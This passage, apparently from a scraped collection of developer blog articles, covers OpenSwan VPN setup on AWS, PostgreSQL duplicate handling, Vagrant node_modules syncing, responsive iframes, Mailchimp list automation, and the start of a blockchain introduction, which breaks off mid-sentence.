the 3rd-party through our VPN instance:\n\n\nGo to the VPC service and select Route Tables in the side bar.\n\n\n\nEach subnet will be associated with a route table. For each route table that is associated with one of your public subnets, we need to add the following rule:\n\nDestination: IP range of third-party network (10.0.1.0/24 in the diagram)\nTarget: {select your Openswan VPN instance from the dropdown}\n\n\n\nPart 2) Install and Configure OpenSwan\nWe are done with the AWS console for now.\nThe next step is to log into the instance and set up Openswan itself.\n\nSSH into the VPN instance: ssh ec2-user@{EIP}\nInstall openswan: sudo yum install openswan.\nThis will create an IPSec configuration file.\nWe need to edit it: sudo vi /etc/ipsec.conf\nWe want to include configuration files in /etc/ipsec.d/.\nFor this, you need to uncomment the last line:\n\n # /etc/ipsec.conf - Openswan IPsec configuration file\r\n#\r\n# Manual: ipsec.conf.5\r\n#\r\n# Please place your own config files in /etc/ipsec.d/ ending in .conf\r\n\r\nversion 2.0 # conforms to second version of ipsec.conf specification\r\n\r\n# basic configuration\r\nconfig setup\r\n# Debug-logging controls: \"none\" for (almost) none, \"all\" for lots.\r\n# klipsdebug=none\r\n# plutodebug=\"control parsing\"\r\n# For Red Hat Enterprise Linux and Fedora, leave protostack=netkey\r\nprotostack=netkey\r\nnat_traversal=yes\r\nvirtual_private=\r\noe=off\r\n# Enable this if you see \"failed to find any available worker\"\r\n# nhelpers=0\r\n\r\n#You may put your configuration (.conf) file in the \"/etc/ipsec.d/\" and uncomment this.\r\ninclude /etc/ipsec.d/*.conf\r\n\n\nNext we create our VPN configuration in a new file: sudo vi /etc/ipsec.d/third-party-vpn.conf.\nThis part is the tricky bit.\nYou can start by pasting the following template and replacing the option values with the correct settings for your environment.\u201c`bash\nconn third-party # Name of the connection. You can call it what you like\ntype=tunnel\nauthby=secret\nauto=start # load connection and initiate it on startup\n# Network Info\nleft=%defaultroute\nleftid={EIP} # Elastic IP of the VPN instance\nleftsourceip=172.31.1.15 # Private IP of the VPN instance\nleftsubnet=172.31.1.0/24 # IP range of your public subnet. Use this if you have a single public subnet.\n# If you have multiple subnets, use \u201cleftsubnets = {172.31.1.0/24 172.31.3.0/24 [\u2026]}\u201d\nleftnexthop=%defaultroute\nright={3rd-party-PublicIP} # Public IP address of third-party\u2019s VPN endpoint\nrightid={3rd-party-PrivateIP} # Private IP address of third-party\u2019s VPN endpoint if you have it\nrightsubnet=10.0.1.0/24 # IP range of third-party network. Use \u201crightsubnets\u201d if multiple subnets\n# Security Info\r\nike=aes192-sha1;modp1536 # IKE Encryption Policy and Diffie-Hallman Group\r\nikelifetime=3600s # IKE Lifetime\r\nesp=aes192-sha1;modp1536 # ESP Encryption policy and Diffie-Hallman Group\r\nsalifetime=43200s # IPSec Lifetime\r\npfs=yes # Perfect Forward Secrecy\r\n\n\u201c`\n\nThe configuration here needs to match what the third-party has set up on their side of the VPN connection.\nIn particular, make sure that IP addresses are correct and that both sides use the same authentication settings.\nIf you are interested to see what other options exist, take a look at the ipsec manual.\n\n\nNote that we used the setting authby=secret.\nThis means that Openswan will use a \u201cPre-shared key\u201d (PSK) to authenticate the connection.\nA PSK is simply a secret that is shared between you and the other side.\nWe need to create a secrets file sudo vi /etc/ipsec.d/third-party-vpn.secrets and paste:\n{EIP} {3rd Party Private IP}: PSK \"MY_SECRET_PRE_SHARED_KEY\"\r\n\nreplacing {EIP}, {3rd Party Private IP} and MYSECRETPRESHAREDKEY with the correct values.\nWe can now start Openswan:\n\nsudo service ipsec start # Start the service. This will try to establish the tunnel\r\nsudo chkconfig ipsec on # Make sure OpenSwan starts on boot\r\n\n\nFinally, since we will be using this instance as a router, we need to enable IP forwarding: sudo vi /etc/sysctl.conf and change the ip_forward option from 0 to 1:\n\nnet.ipv4.ip_forward = 1\r\n\n\nRestart the network:\n\nsudo service network restart\r\n\nIf everything went well, you should now have a working connection.\nPart 3) Test the Connection\nWe will test the connection in this order:\n\nCheck that the VPN tunnel can be established\nTest that you can connect to the 3rd-party from the VPN instance\nTest that you can connect to the 3rd-party from your web servers\n\n\n1. Test the VPN tunnel\nYou can check the status of the VPN tunnel using\nsudo ipsec auto --status\r\n\nIf the tunnel is up, you should see a line beginning with the name of your connection (\"third-party\" in our case) that contains the following statement near the end of the output:\nIPsec SA established\nIf you don\u2019t see this, the output should tell you how far into process it got and at what point the tunnel failed to build.\nTo get a few more logs, you can also try\nsudo ipsec auto --replace third-party\r\nsudo ipsec auto --up third-party\r\n\nMake sure the security protocols and the PSK match what the 3rd party has.\n\nThe logs should tell you which of them don\u2019t match\n\nIf the tunnel does not even begin the build process, you might be blocking traffic to/from the third party for you public subnets.\n\nIn the AWS console, in VPC -> subnets, check the Network ACL tab of your public subnets and make sure there are no rules that are blocking the traffic.\nCheck that the Openswan EC2 instance has the correct security group.\nIn particular, check that it\u2019s not blocking traffic to the third-party.\nAsk the third-party if they can see any attempts at building a VPN tunnel in their logs.\n\n2. Test connectivity from the Openswan instance\nOnce the tunnel is established, you can start testing the connection between your VPN instance and the 3rd-party.\nIdeally, you should attempt to make an HTTP or HTTPS request directly to the third-party API (e.g. using the curl command).\nYou can also try to ping a host in the 3rd-party network (for this, you need to allow TCP traffic in the instance\u2019s security group).\nIf you get a response, congrats!\nIf not, try the following:\n\nDouble-check that your Network ACLs and Security Groups are not blocking your request.\nAsk the 3rd-party to check that their firewall is not blocking your request.\nIf they are not seeing your requests, ask them to check their NAT-T configuration (this has caused me problems before when trying to connect to Cisco ASA devices)\n\nNAT-T should be enabled on our side by default.\nTo check, look in /etc/ipsec.conf for the value of the nat_traversal option.\n\n\n\n3. Test the connection from your web servers\nOnce you have connectivity between your Openswan instance and the 3rd party, you can finally test the connection from your web servers.\nSSH into one of your web servers and try to make a request to the third-party API.\nIf you get a response, well done, you have come a long way!\nYou should verify that you can actually connect to the 3rd party from all of your web servers.\nIf you are running a massive fleet, at least check that the connection works from each subnet.\nFor those less fortunate of you, repeat the debug steps above.\nIn addition to that, you can also try the following:\n\nCheck that the routing is set up correctly:\n\nIn the AWS Console, check that the route table of your public subnets is set up correctly (see step 6 in part 1 above)\nTry \u201ctraceroute <ip of third-party API server>\u201c.\nYou should see that the first step in the route is the (private) IP of the OpenSwan instance.\n\n\nIt is always worth checking that your security groups are not blocking your traffic.\nIt could happen that only some but not all of your web servers are able to connect to the 3rd party.\nIn this case:\n\nCheck that the VPN is correctly configured to handle all of your public subnets.\nIn particular, you may need to use the \u201cleftsubnets\u201d instead of the \u201cleftsubnet\u201d option.\nCheck with the 3rd party that they have configured their side of the connection (both the VPN and the firewalls) for all of your public subnets.\n\n\n\nNext Steps\nHopefully you should have a working VPN connection now.\nHowever, our VPN configuration still has a lot of room for improvement.\nThe most urgent concern is that we have not set up any monitoring or automatic fall-backs for the VPN tunnel.\nTo do so, you would need to create and configure a second VPN instance.\nNext, you could then setup a monitoring script on a separate instance that checks the state of each VPN tunnel.\nIf tunnel A goes down, the script should immediately adjust your route tables to reroute traffic through tunnel B while also trying to fix the tunnel A.\nIf you want to go down that rabbit-hole, I suggest you start with Appendix A of the AWS VPC connectivity options whitepaper.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBrian Azizi\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\n\nI was working on a project where we needed to aggregate information on employees from 10 different tables and make the resulting table clear (no duplicate rows), containing full information on people working in the big company.\nWhile making this I understood that the emergence of duplicates (or duplicate rows) is inevitable when you work with a large amount of data aggregating several tables into one. Fortunately PostgreSQL has some features that are extremely useful while working with detection and elimination of duplicates.\nI want to put your attention on these features and help you to never have problems with duplicates.\nDuplicate or Duplicate row is a row in a table looking exactly or almost exactly like some another row (original row) in this table.\nSo we can deal with absolutely identical rows and almost identical rows. For example theirs ids can differ but all other properties are exactly the same.\nSo, what can you do with the duplicates?\nFor absolutely identical rows:\n\nFind them\nDelete them\n\nFor almost identical rows (identical except for one or more properties):\n\nCombine information from duplicate rows into one row\nSelect one of the rows according to some criteria and delete the remaining ones.\n\nThat is what my article is about.\n1) How to find duplicates?\nImagine you have a table containing some data on employees of a company. For example, in this table we are dealing with personal data about employees including their first name, last name, position, department and date of the beginning of a contract in these department on these position.\n+----+-----------+-----------+------------+---------------+-------------+\r\n| id | firstname | lastname  | startdate  | position      | department  |\r\n+----+-----------+-----------+------------+---------------+-------------+\r\n| 1  | Olivier   | Le Blanc  | 2010-03-01 | PDG           | RTM         |\r\n| 2  | Maria     | Green     | 2016-06-01 | Intern        | STP/RMP     |\r\n| 3  | Maria     | Green     | 2016-11-01 | RH            | STP/RMP     |\r\n| 5  | Maria     | Green     | 2017-07-07 | DRH           | STP/RMP     |\r\n| 4  | Paul      | Jones     | 2017-01-01 | Developer     | RTM/FMP     |\r\n| 6  | Paul      | Jones     | 2017-06-01 | Project Chief | RTM/BSO     |\r\n+----+-----------+-----------+------------+---------------+-------------+\r\n\r\n\nIn order to find duplicates we face two problems:\n\nCount the number of rows in each group.\nFind duplicate rows and theirs ids\n\nHere is the fastest way to split rows into categories and to display those that have more than one row in it.\nSELECT\r\n  firstname,\r\n  lastname,\r\n  count(*)\r\nFROM people\r\nGROUP BY\r\n  firstname,\r\n  lastname\r\nHAVING count(*) > 1;\r\n\n+-----------+-----------+-------+\r\n| firstname | lastname  | count |\r\n+-----------+-----------+-------+\r\n| Maria     | Green     |   3   |\r\n| Paul      | Jones     |   2   |\r\n+-----------+-----------+-------+\r\n\n\nCount(*) counts the number of rows in each group.\nIn GROUP BY we can add the criterias (properties) by which we are looking for duplicates.\nThe result is a table (firstname, lastname, count) containing the properties according which the groups were defined and the number of rows per group.\n\nNow we want to display duplicate rows with all information.\nSELECT * FROM\r\n  (SELECT *, count(*)\r\n  OVER\r\n    (PARTITION BY\r\n      firstname,\r\n      lastname\r\n    ) AS count\r\n  FROM people) tableWithCount\r\n  WHERE tableWithCount.count > 1;\r\n\n+----+-----------+----------+--------------+---------------+------------+---------+\r\n| id | firstname | lastname |  startdate   | position      | department |  count  |\r\n+----+-----------+----------+--------------+---------------+------------+---------+\r\n| 2  | Maria     | Green    |  2016-06-01  | Intern        | STP/RMP    |    3    |\r\n| 3  | Maria     | Green    |  2016-11-01  | RH            | STP/RMP    |    3    |\r\n| 5  | Maria     | Green    |  2017-07-07  | DRH           | STP/RMP    |    3    |\r\n| 4  | Paul      | Jones    |  2017-01-01  | Developer     | RTM/FMP    |    2    |\r\n| 6  | Paul      | Jones    |  2017-06-01  | Project Chief | RTM/BSO    |    2    |\r\n+----+-----------+----------+--------------+---------------+------------+---------+\r\n\n\nPARTITION BY divides into groups and disposes all rows that are presented one after another.\nUsing PARTITION BY and \u2018count > 1\u2019 we can extract rows having duplicates.\nThe result is a table with columns (id, firstname, lastname, startdate, position, department, count) where we see all the duplicate rows including the original row.\n\nBy the way, through the PARTITION BY it is possible to simplify a whole class of tasks of analytics and billing. Instead of count(*) we can use any function like MEAN, MAX, MIN, SUM\u2026 and calculate a value per group. Mean salary is a good example.\n2) How to delete duplicates?\nThe next question that inevitably arises: how to get rid of duplicates?\nHere is the most efficient and fastest way to select data without unnecessary duplicates:\nFor absolutely identical rows:\nSELECT DISTINCT * FROM people;\r\n\r\nFor almost identical rows:\r\n\r\nSELECT DISTINCT ON (firstname, lastname) * FROM people\nIn the case of almost identical rows we need to list all properties on the basis of which we are looking for duplicates.\nThus, if we want to remove duplicated data from a table, we can use the following method :\nDELETE FROM people WHERE people.id NOT IN \r\n(SELECT id FROM (\r\n    SELECT DISTINCT ON (firstname, lastname) *\r\n  FROM people));\r\n\nFor those who have read this article up to this point, here is a very cool tip of PostgreSQL to keep your code clean and readable.\nWITH unique AS\r\n    (SELECT DISTINCT ON (firstname, lastname) * FROM people)\r\nDELETE FROM people WHERE people.id NOT IN (SELECT id FROM unique);\r\n\nA very useful thing for complex queries where without named subqueries you can break your entire brain, conjuring with joins and brackets of subqueries. This incredibly useful feature is called Common Table Expression. By the way, there is a possibility to use multiple subqueries and one subquery can be based on another subquery. You can learn more here.\nWITH some_name AS\r\n (SELECT DISTINCT ON (firstname, lastname) * FROM people),\r\nsome_another_name AS (SELECT id, position, department FROM some_name)\r\nSELECT * FROM some_another_name WHERE ... ;\r\n\n3) How to combine duplicate rows in one single row\nNow we come to something more interesting. We want to make sure that each category has only one row but we don't want to lose any information. The best way to do this is to remove duplicates while merging their records into one row. For example, we want to have only one row per person, but for which both position values and department values are written into one cell in the following way 'value 1 / value 2 / ...'. This is easily accomplished by using the function of concatenation 'string_agg'.\nSELECT\r\n  firstname,\r\n  lastname,\r\n  string_agg(position, ' / ') AS positions,\r\n  string_agg(department, ' / ') AS departments\r\nFROM people\r\nGROUP BY\r\n  firstname,\r\n  lastname;\r\n\r\n\n+-----------+----------+---------------------------+-----------------------------+\r\n| firstname | lastname | positions                 | departments                 |\r\n+-----------+----------+---------------------------+-----------------------------+\r\n| Maria     | Green    | Intern / RH / DRH         | STP/RMP / STP/RMP / STP/RMP |\r\n| Olivier   | Le Blanc | PDG                       | RTM                         |\r\n| Paul      | Jones    | Developer / Project chief | RTM/FMP / RTM/BSO           |\r\n+-----------+----------+---------------------------+-----------------------------+\n\nGROUP BY separates data on categories.\nstring_agg() aggregates information from duplicate rows\nNo matter how many duplicates we have, in the end we\u2019ll have just three rows with combined information.\n\n4) How to delete unwanted duplicates and save exactly what you want\nNow let\u2019s imagine that for every employee there are two properties indicating the start date and the end date of a contract.\nIf some person changed several positions in the company, there are few corresponding lines in the table. For each employee we need to find a row corresponding to the last contract, not taking into account the previous contracts. That is, in fact, find a contract with the latest start date.\nYou can do this as follows:\nSELECT id, firstname, lastname, startdate, position FROM\r\n  (SELECT id, firstname, lastname, startdate, position,\r\n     ROW_NUMBER() OVER \r\n(PARTITION BY (firstname, lastname) ORDER BY startdate DESC) rn\r\n   FROM people\r\n  ) tmp WHERE rn = 1;\n+----+------------+----------+--------------+---------------+\r\n| id | firstname  | lastname |  startdate   | position      |\r\n+----+------------+----------+--------------+---------------+\r\n| 5  | Maria      | Green    |  2017-07-07  | DRH           |\r\n| 1  | Olivier    | Le Blanc |  2010-03-01  | PDG           |\r\n| 6  | Paul       | Jones    |  2017-06-01  | Project Chief |\r\n+----+------------+----------+--------------+---------------+\n\nPARTITION BY divides into groups and ORDER BY sorts them by descending order.\nROW_NUMBER() assigns an integer number to every row in each category.\nTo have rows with the latest date we simply choose those with row number equals to 1.\nNotice that we need to have some name for a query in br\u0430\u0441kets. It's better to use a common table expression WITH ... AS \n\nConclusion\nAs you can see, working with duplicates is not so difficult. They are easy to be detected and to be removed if necessary.\n\n"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tVagrant offers the possibility to sync files between your host and your VM, a great way to edit your code on your favorite IDE while being able to run it in a VM.\nNot all files are worth syncing though \u2013 have you ever wished to specifically avoid syncing heavy folders to your host such as your node modules or your error logs?\nLet\u2019s see how doing this can lead to tripling the speed of your npm install.\nYou have different ways to sync your files with Vagrant. For performance you probably want to use NFS \u2013 only available if your host is macOS or Linux.\nDisabling the sync of node modules\n\nOn one of my projects, I was hit by a file sync issue between my host and my VM, due to the then recently released Apple APFS filesystem.\nTo mitigate this issue I needed to find a way to avoid my node modules to be synced from my VM to my host, and was helped by a trick found on Stack Overflow.\nThe idea here will be to replace in your VM your node_modules folder with a symbolic link pointing to a folder outside of the synced folder(s) \u2013 hence, content of node_modules won\u2019t be synced to your host.\nWhat your host will see will only be the symbolic link, which won\u2019t point to an actual folder on your host \u2013 this shouldn\u2019t cause any issue.\nLet\u2019s say you have already set up a Vagrant synced folder with NFS, for example thanks to the following line in your Vagrantfile:\nconfig.vm.synced_folder \".\", \"/your-project\", type: \"nfs\"\r\n\nIf you have already run npm install you first need to move the node_modules outside of your synced folder:\n\u26a0\ufe0f Note: all commands from now on are to be run in your VM\n$ cd /your-project\r\n$ mv node_modules /outside-of-synced-folder\r\n\nIf you haven\u2019t, you need to create the folder:\n$ mkdir /outside-of-synced-folder/node_modules\r\n\nOnce node_modules has been moved or created, you can create the symbolic link in your project directory:\n$ ln -s /outside-of-synced-folder/node_modules /your-project/node_modules\r\n\nThen you can run:\n$ npm install\r\n\nCase in point\nTrying this with Sound Redux, a popular open-source React project, we time npm install on a 2017 MacBook Pro:\nIt will take 41s if node_modules is synced to the host, and only 14s if not (a 3x improvement)\nWith Sentry (the crash reporting platform), we go from 1mn30 to 26s (a 5x improvement)\nFinally, on my own project using Angular and an older version of npm, we go from 9mn to 3mn (a 3x improvement).\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tIvan Poiraudeau\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tNowadays, more and more people use their phones to navigate the web. It is therefore even more important now for websites to be responsive. Most websites use YouTube videos, Google maps or other external website elements embedded in them. These functions are most commonly incorporated in a web page using the html iframe element and is one of the trickiest thing to make responsive.\nI have struggled for a long time to get my YouTube videos to keep their ratio on different screen sizes. When testing my website on a smartphone, I would spend hours trying to figure out why my videos did not do what I expected\u2026 Until I finally discovered a great CSS trick that I can apply to all my iframes. Play with the size of the screen to see the responsive iframe at work. I can\u2019t wait to share this trick with you in the following article.\nResponsive Iframes\nFor the purpose of demonstration, this article will use a YouTube embed for our iframe. First, go on YouTube, click on \u2018share\u2019 under the video and then \u2018embed\u2019. You should now have the following code to copy into your html.\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" frameborder=\"0\" gesture=\"media\" allow=\"encrypted-media\" allowfullscreen></iframe>\r\n\nNext, we need to remove width=\u201d560\u2033 height=\u201d315\u2033 because these are here to set the size of the iframe. Since we are going to be setting the size ourselves, this is unnecessary for our purposes.\nUsing CSS\nAfterwards, we need to wrap the iframe in another html element like a <div>, this is very important as this element will be sizing your iframe. Then add a CSS class to your new wrapping element and one class to your iframe as seen below.\n<div class=\"resp-container\">\r\n    <iframe class=\"resp-iframe\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" gesture=\"media\"  allow=\"encrypted-media\" allowfullscreen></iframe>\r\n</div>\r\n\nDefine your wrapper class with the following style:\n.resp-container {\r\n    position: relative;\r\n    overflow: hidden;\r\n    padding-top: 56.25%;\r\n}\r\n\n\nposition: relative The position of both the wrapper and the iframe is very important here. We are setting it to a position: relative so that we can later position our iframe in relation to the wrapping element. This is because in CSS, position: absolute positions the element based on the closest non static parent element.\noverflow: hidden is there to hide any elements that might be placed outside of the container.\npadding-top: 56.25% This is where the magic is. In CSS, the padding-top property can receive a percentage, this is what keeps our iframe to the right ratio. By using percentage, it will calculate the padding to use based on the width of the element. In our example, we want to keep the ratio of 56.26% (height 9 \u00f7 width 16) because this is the default ratio for YouTube videos. However, other ratios can be used as well.\n\nDefine your iframe class as follows:\n.resp-iframe {\r\n    position: absolute;\r\n    top: 0;\r\n    left: 0;\r\n    width: 100%;\r\n    height: 100%;\r\n    border: 0;\r\n}\r\n\n\nposition: absolute; This will give the iframe a position relative to the wrapper and let it be positioned over the padding of the wrapper.\ntop: 0 and left: 0 are used to position the iframe at the center of the container.\nwidth: 100% and height: 100% make the iframe take all of the wrapper\u2019s space.\n\nDemo\nOnce you are done, you should get an iframe that is responsive. Here I have a <video> instead because of some blog restrictions. But it works exactly the same way. You can play around with your browser size and see how responsive your iframes would be!\n\nUsing CSS Frameworks\nMost projects will use some kind of CSS framework to help with keeping the styling uniform throughout the project, may it be Bootstrap or Material-UI. Some of these frameworks already have predefined classes that will do exactly the same as what is in the above trick but unfortunately not all. In each case you need to create a wrapping element and give it a certain class.\nUsing Bootstrap\nIn Bootstrap 3.2 and over, use the predefined class .embed-responsive and an aspect ratio class modifier like .embed-responsive-16by9. There are other ones listed below. Similarly to the trick above, this aspect ratio modifier will add the padding-top with different percentages depending on the given modifier class. Then give your iframe the .embed-responsive-item class. Here is an example:\n<div class=\"embed-responsive embed-responsive-16by9\">\r\n  <iframe class=\"embed-responsive-item\" src=\"https://www.youtube.com/embed/dQw4w9WgXcQ\" allowfullscreen></iframe>\r\n</div>\r\n\nThe different aspect ratios that can be used are:\n\n.embed-responsive-21by9\n.embed-responsive-16by9\n.embed-responsive-4by3\n.embed-responsive-1by1\n\nYou can of course create your own modifier class. For example:\n.embed-responsive-10by3 {\r\n   padding-top: 30%;\r\n}\r\n\nUsing Materialize\nIf you are using Materialize CSS, then you don\u2019t need your own classes either. Just add the video-container class to your wrapper:\n<div class=\"video-container\">\r\n  <iframe src=\"//www.youtube.com/embed/Q8TXgCzxEnw?rel=0\" frameborder=\"0\" allowfullscreen></iframe>\r\n</div>\r\n\nUsing Foundation\n<div class=\"responsive-embed\">\r\n  <iframe src=\"https://www.youtube.com/embed/mM5_T-F1Yn4\" frameborder=\"0\" allowfullscreen></iframe>\r\n</div>\r\n\nAspect ratio modifier classes are set in your $responsive-embed-ratios map in your Foundation settings file:\n$responsive-embed-ratios: (\r\n  default: 16 by 9,\r\n  vertical: 9 by 16,\r\n  panorama: 256 by 81,\r\n  square: 1 by 1,\r\n);\r\n\nResponsive Images\nImages are a lot easier to deal with. With only a little CSS, you can have images keep their original aspect ratio whatever the size of the screen.\nUsing width\nIf you do not set the width to a fixed amount, but instead you fix it to 100% with a height: auto as so:\nimg {\r\n    width: 100%;\r\n    height: auto;\r\n}\r\n\nThen your images will be responsive and keep their ratio. However, using width means your images can scale to larger than their original size though and you could end up with a blurry image.\nUsing max-width\nIf you don\u2019t want your images to be larger than the original size, then use max-width: 100% instead:\nimg {\r\n    max-width: 100%;\r\n    height: auto;\r\n}\r\n\nIn the end, you will get responsive images, just like this one:\n\nSumming it all up\nIn conclusion, in this article we have seen the CSS trick that can make your iframes responsive. We have also seen multiple popular frameworks that provide predefined classes that will do it for you. As you saw, it\u2019s actually pretty easy and I hope I saved you hours of trying to fit your iframes on your mobile. Lastly, you saw how easy it is to fit your images in your responsive website.\nLet me know below in the comments what you think of the article and if you have any questions about anything above.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGregory Gan\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nMailchimp is a marketing tool that lets your marketing department have autonomy to control their own marketing emails. As developers, we can also use the flexible API for custom integrations. When we combine the two, we get a powerful and flexible tool that allows for complex marketing campaigns that are specific to product needs.\nA key Mailchimp feature is lists \u2013 these are a collection of customers that receive your marketing campaigns. Each customer in the list can have a number of properties, called merge fields that use to assign additional data to each customer. These properties can then be rendered in emails, or used to segment the customers to send campaigns to a specific subset of our list.\nThe common use case for Mailchimp is having one list for all of your customers, using segments to send specific campaigns. We can specify a segment that has a date of birth in august, or everybody called John to target them specifically. However, when you would like to segment your customers in a more complex manor \u2013 such as customers who behave in a particular way on your application the previous day, mailchimp leaves you stuck.\nWe could have merge field that indicates whether a customer is eligible for inclusion in a segment, however we are unable to segment based on relative dates such as yesterday. To solve this, we generate our own list and the integrated API to populate with the customers we want. We all we need to do in Mailchimp is set up an automated campaign mail to send out daily to the automatically populated list.\nSetting up\nYou\u2019ll first need a Mailchimp account, and API key (which can be generated in the user settings for your application). You\u2019ll then need to create the list on mailchimp, use the GUI on the site as its much easier than the API. Leave the merge fields empty for now, we will come back to them later.\nWe connect to the api using the python package mailchimp3. For this example, we\u2019ll assume we have a customer and activity models \u2013 where customers can have many activities. Firstly we need to configure mailchimp3, to generate the api client we write the following:\nfrom mailchimp3 import MailChimp\r\nfrom django.conf import settings\r\n\r\nclient = MailChimp(MAILCHIMP_USERNAME, MAILCHIMP_API_KEY)\r\n\nWe can then check out what lists we have by running:\nclient.lists.all(get_all=True, fields=\"lists.name,lists.id\")\r\n\nThis will return the names and IDs for all of the lists our account has. Now take note of the list ID you want to dynamically update \u2013 we\u2019ll refer to this list ID as MAILCHIMP_LIST_ID.\nCreating the extract\nThe first step is to create an extract which contains all the customers and relevant merge fields for the Mailchimp list. This is very business specific and can be as complex as you like. We use a simple example that returns all the customers who had an activity longer than 5 minutes yesterday:\nfrom app.models import Activity\r\nfrom django.utils.timezone import timedelta, now\r\n\r\ndef generate_extract(duration):\r\n\r\n    kwargs = {\r\n        'activity_date': now() - timedelta(days=1)\r\n        'activity_duration': 300\r\n    }\r\n    return Activity.objects.filter(**kwargs) \\\r\n        .select_related('customer') \\\r\n        .distinct('email')\r\n\nNow have a function that gets us our list of members, we need to transform them into a format that Mailchimp is expecting. The Mailchimp API lets us chose between making a request for each member we want to add, or to batch the requests into a single request. We choose the later implementation as we will be adding many customers to the list at a single time.\nSending to Mailchimp\nThe batch endpoint expects a list of operations that are in the mailchimp API format. For adding users to a list that is a POST request to /lists/MAILCHIMP_LIST_ID/members, with the body of each request being JSON in the following format:\n{\r\n    'status': 'subscribed',\r\n    'email_address': 'xxx@gmail.com',\r\n    'merge_fields': {\r\n        field_1: xxx\r\n        ...\r\n    }\r\n}\r\n\nWhere we can pass as many or as few merge fields as we like.\nGiven this, we need to create a function that takes a single customer model and returns an dict in this format with the merge_fields key containing an object with all the merge fields we want to include for our list! We can sends different types of data here, strings, numbers and dates for example.\ndef customer_to_mailchimp_member(customer):\r\n\r\n    return {\r\n        'status': 'subscribed',\r\n        'email_address': 'xxx@gmail.com',\r\n        'merge_fields': {\r\n            FIRSTNAME: customer.first_name,\r\n            LASTNAME: customer.last_name,\r\n            DOB: customer.date_of_birth\r\n        }\r\n    }\r\n\nNow we have this transformation function, we can apply it to every customer to create a list of members ready to upload.\nConfiguring the list\nThe next step is configure the mailchimp list to match all of the merge fields we want to include with our users. Mailchimp provides an easy to use interface to set this up, in the settings of your list under List fields and |* merge *| tags. Here you\u2019ll need to specify the type of each merge field, and ensure the merge tag exactly matches the key in the merge_fields object from the customer transformer.\nAfter the settings are configured, all that remains is to upload the users.\nUploading\nNext we need to create a list of operations that make the POST request to our Mailchimp list endpoint. We write the following general for adding members already in a format ready to upload, given a list:\ndef batch_add_members_to_list(members, list_id):\r\n\r\n    operations = [{\r\n        'method': 'POST',\r\n        'path': '/lists/' + list_id + '/members',\r\n        'body': json.dumps(member)\r\n    } for member in members]\r\n\r\n    client.batches.create(data={'operations': operations})\r\n\nHere we see that we construct a list of operations in a standard format to send to the endpoint, then we use the API client to make a single request which contains all of our operations. When Mailchimp receives this, it creates a new batch object attached to our account and returns the batch ID amongst other information about the newly created batch.\nManaging batches\nOnce you send a batch to Mailchimp it may take some time to execute the operations contained in the request. You can track the progress of a batch using:\nclient.batches.get(BATCH_ID)\r\n\nThis will return an object that tells you the status of the batch, which is pending when it is queued, started once Mailchimp has begun executing the operations and finished once it is complete. Once the batch has finished the response object will tell us how many operations completed, and how many failed. Further, we can get the results of all the operations contained within from the response_body_url object \u2013 this is a link to a JSON array of responses for each operations request.\nOnce a batch is complete, you can view the members added to the list! Alternatively, if it hasn\u2019t worked for you, you can debug using the batch management mentioned above.\n\nTo automatically add customers to our list, we use a webbook in our application that is called from an AWS lambda function at a specific time. The webhook then generates the customers and adds them to our Mailchip list using the method outlined above.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJosh Warwick\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tUnderstanding the concepts behind a blockchain is not as hard as one could imagine.\nOf course some specific concepts of a blockchain environment are harder to understand (e.g. mining) but I will try first to give you a simple introduction to the most important concept of blockchain.\nThen we will write a first smart contract inside a blockchain.\nThat will be the first step before trying to build a decentralized web application implementing smart contracts!\nBasically a blockchain is a chain of block, more precisely a linked chain of blocks.\n\nA block is one element of a blockchain and each block has a common structure.\nThe security of a blockchain is assured by its decentralized nature.\nUnlike a classic database, a copy of the blockchain is stored in each node of its peer-to-peer network.\nIn the case where the local version of a blockchain in a networks node were corrupted, all the other nodes of the P2P network would still be able to agree on the actual value of the blockchain: thats the consensus.\nIn order to add a fraudulous transaction to a blockchain, one should be able to hack half of the user of the network.\nFurthermore, it is also very hard to alter even only a local version of a blockchain because of a block structure.\nBlock 